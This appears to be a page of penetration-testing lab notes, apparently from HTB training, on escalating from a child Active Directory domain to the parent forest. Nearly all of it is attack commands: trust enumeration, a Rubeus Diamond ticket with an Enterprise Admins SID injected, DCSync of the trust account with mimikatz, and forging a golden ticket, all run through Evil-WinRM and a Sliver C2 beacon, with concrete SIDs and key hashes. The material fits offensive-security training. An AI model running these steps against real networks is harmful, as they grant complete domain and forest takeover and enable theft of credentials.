# 15.10 Forest Compromise Trust Abuse

> Hop child→parent with a Diamond ticket carrying `/sids:<EA-SID>` or a Golden ticket using the inter-realm trust NTLM key.

## Overview

Child-to-parent forest compromise uses either a diamond ticket with /sids pointing to Enterprise Admins (EA SID = parent-SID-519), or a golden ticket abusing the trust key (NTLM of HTB$ inter-realm account). Both require child domain krbtgt's AES256 or NTLM and the parent domain's SID.

## Steps

- Enumerate forest trust and domain SID: `Get-DomainTrust` and SharpView `Get-DomainSid -Domain htb.local`.
- Get parent domain SID to construct EA SID: `S-1-5-21-<parent>-519`.
- Method 1 (Diamond): Rubeus diamond /tgtdeleg with /sids=<EA-SID> and child krbtgt AES256.
- Method 2 (Trust Key): DCSync to get HTB$ trust account NTLM, then mimikatz kerberos::golden with /sids=EA-SID and /krbtgt=<HTB$-NTLM>.
- Verify forest access: `ls \\dc02.htb.local\c$`.

## Commands

### Enumerate domain trust

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-DomainTrust
```

### Get parent domain SID

```text
sliver (http-beacon) > sharpview -t 120 -- Get-DomainSid -Domain htb.local
```

### Diamond ticket for forest compromise

```text
sliver (http-beacon) > inline-execute-assembly -t 120 /home/htb-ac-1008/Rubeus.exe "diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-264881711-3359223723-3458204895-519 /krbkey:f2a363997e7539b83637c12d872600a2b4c2727f2ebd35229d33dd85bdc11ed8 /nowrap"
```

### DCSync trust account (from parent DC)

```text
mimikatz # lsadump::dcsync /user:child$
```

### Golden ticket with trust key + EA SID

```text
mimikatz # kerberos::golden /user:student /domain:child.htb.local /sid:S-1-5-21-2749819870-3967162335-1946002573 /krbtgt:ec3e7210e3f08666c5d08c7ecbed1fab /sids:S-1-5-21-264881711-3359223723-3458204895-519 /ptt
```

### Verify parent domain access

```powershell
PS C:\Users\Administrator\Documents> ls \\dc02.htb.local\c$
```
